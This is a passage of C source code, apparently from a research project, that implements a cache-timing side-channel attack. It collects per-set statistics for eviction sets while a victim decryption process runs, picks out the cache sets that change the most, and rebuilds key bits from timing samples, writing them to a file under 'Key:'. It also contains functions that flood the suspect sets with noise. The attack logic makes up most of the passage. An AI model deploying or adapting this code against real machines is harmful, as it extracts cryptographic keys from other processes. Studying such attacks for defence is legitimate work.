		while (LastBitEnd + PatternBitsNum < LastIndex)
		{

			ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '?';
			BadBitsNum++;
			LastBitEnd += PatternBitsNum + 1;
		}

		LastBitEnd = LastIndex + PatternBitsNum;

		ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = '0';
		CurrZeroIdx++;
	}

	// End of string, for printing to screen.
	ReadData[CurrOnesIdx + CurrZeroIdx + BadBitsNum] = 0;

	if (pFoundBitsNum != NULL)
		*pFoundBitsNum = CurrOnesIdx + CurrZeroIdx + BadBitsNum;

	if (WriteToFile)
	{
		for (i = 0; i < SamplesNum; i++)
		{
			TmpSamples[i] += '0';
		}

		TmpSamples[SamplesNum] = 0;

		//fprintf(pFile, "\r\nModified:\r\n%s\r\n", Samples);
		fprintf(pFile, "Key:\r\n%s\r\n", ReadData);
		fclose(pFile);
	}
	// if looking for pattern and the difference between zeros and ones more than 10%, probably a noisy set. give score 0
/*	double diff;
	if (pScore != NULL){
		if (ZerosFound)
			diff = (double)abs(OnesFound - ZerosFound) / (double)(ZerosFound + OnesFound);
//		if (*pScore > 250 && FindPattern)
//			printf("%f\n", diff);
		if (FindPattern && diff < 0.08)
			*pScore = 0;
	}
*/
	// decrease diff precent points for difference
	double diff;
	diff = (double)(OnesFound - ZerosFound) / (double)(ZerosFound + OnesFound);
	if (diff < 0) diff = 0 - diff;		//abs value
	Score = (int)((1. - diff) * Score);
//if (pScore != NULL)
//printf("\nScore - %d, diff - %f", *pScore, diff);

	free(TmpSamples);
	free(ZerosIndexes);
	free(OnesIndexes);
	return ReadData;
}
char* StringToBuff(char* String)
{
	int Len = strlen(String);
	char* pBuff = malloc(Len / 2);
	int i;

	for (i = 0; i < Len; i += 2)
	{
		char tmp = 0;

		if (String[i] >= 'a' && String[i] <= 'f')
			tmp = (String[i] - 'a') + 10;
		else
			tmp = String[i] - '0';

		tmp = (tmp << 4);

		if (String[i + 1] >= 'a' && String[i + 1] <= 'f')
			tmp |= (String[i + 1] - 'a') + 10;
		else
			tmp |= String[i + 1] - '0';

		pBuff[i / 2] = tmp;
	}

	return pBuff;
}


int findsuspectsWithPatterns(Cache_Mapping* pEvictionSets, int* suspectsSets, int SetsFound){
	FILE* out;
	int i;
	char input[20];
	int numberOfSuspestcs = 0;
	Cache_Statistics orderd_results,results;
	//first we'll run the statistics before we start the decryption
	printf("Press any key to Start collecting statistics\n");
	//scanf("%s",input);
	//read_size = recv(client_sock,client_message,1,0);
	if(read_size == 0)
	{
		puts("Client disconnected");
		fflush(stdout);
		exit(0);
	}
	else if(read_size == -1)
	{
		perror("recv failed");
	}
	puts("running..");
	Cache_Statistics ZeroStats[NUMBER_OF_STATS];
	memset(&orderd_results,0,sizeof(Cache_Statistics));
	memset(&results,0,sizeof(Cache_Statistics));
	for(i = 0 ; i < NUMBER_OF_STATS ; i++)
	{
		memset(&(ZeroStats[i]),0,sizeof(Cache_Statistics));
	}
	for(i = 0 ; i < NUMBER_OF_STATS -1 ;i++)
		GetMemoryStatistics(pEvictionSets, &(ZeroStats[i]));
	//Now we will try to find the sets with the most change in use - and hope that those sets are the relevant sets.
	printf("Calculation complete\nPlease start the Decryption processes and Press Any key\n");
	write(client_sock,"ABABA\n",sizeof("ABABA\n"));
	recv(client_sock,client_message,1,0);
	//scanf("%s",input);
	puts("running..");

	Cache_Statistics OneStats[NUMBER_OF_STATS];
	for(i = 0 ; i < NUMBER_OF_STATS ; i++)
	{
		memset(&(OneStats[i]),0,sizeof(Cache_Statistics));
	}
	for(i = 0; i <NUMBER_OF_STATS -1 ; i++)
		GetMemoryStatistics(pEvictionSets, &(OneStats[i]));
	printf("Calculation complete\n Now we'll try to find the most Change in use sets\n ");
	out = fopen("out.txt","w");
	for(i =0 ; i < SetsFound ; i++){
		int j;
		for(j = 0 ; j< NUMBER_OF_STATS -1 ; j++){
			ZeroStats[NUMBER_OF_STATS -1].SetStats[i].num += ZeroStats[j].SetStats[i].num;
			OneStats[NUMBER_OF_STATS -1].SetStats[i].num += OneStats[j].SetStats[i].num;
		}
		long long num = OneStats[NUMBER_OF_STATS -1].SetStats[i].num -  (ZeroStats[NUMBER_OF_STATS -1].SetStats[i].num);
		if(num > 0)
			results.SetStats[i].num = num;
		if(results.SetStats[i].num > ZERO_ONE_STATISTICS_DIFF_THR){
			suspectsSets[numberOfSuspestcs] = i;
			numberOfSuspestcs++;
		}
	}
	SortStatistics(&results,&orderd_results);
	for(i = 0 ; i< SetsFound ; i++ ){
		fprintf(out,"%lld\n",orderd_results.SetStats[i].num);
	}
	fclose(out);
	return numberOfSuspestcs;

}

//Noise Suspected Sets according to the user choice
//void noiseSuspectedSets(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum, int numOfLines)
//{
//	int i,j,k;
//	exitflag =1;
//	while(exitflag)
//	{
//		for(i = 0 ; i < suspectsNum ; i++)
//			for(j = 0; j < numOfLines; j++)
//				if( 1 == pEvictionSets->Sets[suspectsSets[i]].Lines[0][j]) k++;
//		//printf("%d\r\n\033[1A", k);
//	}
//
//}


void noiseSuspectedSets(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum, int numOfLines)
{
	int i,j,k;
	struct timespec start, end;
	qword TimeSpent = 0;
	long long counter = 0;
	exitflag =1;
	//pFile = fopen("Noisification_Times.txt", "wr");
	clock_gettime(CLOCK_REALTIME, &start); 
		
	while(exitflag)
	{
		for(i = 0 ; i < suspectsNum ; i++)
		{
			for(j = 0; j < numOfLines; j++)
			{
				counter++;
				if( 1 == pEvictionSets->Sets[suspectsSets[i]].Lines[0][j]) k++;			
			}
		}
exitflag=0;
	}
	clock_gettime(CLOCK_REALTIME, &end);
	TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
	printf("%llu - %llu + %llu - %llu =  %llu  \n", end.tv_nsec, start.tv_nsec, end.tv_sec*1000000000, start.tv_sec*1000000000, TimeSpent/counter);
	printf("  %llu  %d /n", TimeSpent, counter);
}

/**
 * Noise random line in each set from the suspected sets
**/
void noiseRandLine(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum)
{
	int i, k;
	exitflag =1;
	while(exitflag)
	{
		for(i = 0; i < suspectsNum; i++)
			if( 1 == pEvictionSets->Sets[suspectsSets[i]].Lines[0][rand()%12]) k++;		
	}
}


void noiseRandSets(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum, int numOfSetsToNoise)
{
	int i, k;
	int setsToNoise[numOfSetsToNoise];

	for(i = 0; i < numOfSetsToNoise; i++)
		setsToNoise[i] = rand()%suspectsNum;
	
	exitflag =1;
	while(exitflag)
		for(i = 0; i < numOfSetsToNoise; i++)
			if( 1 == pEvictionSets->Sets[suspectsSets[setsToNoise[i]]].Lines[0][rand()%12]) k++;		

}


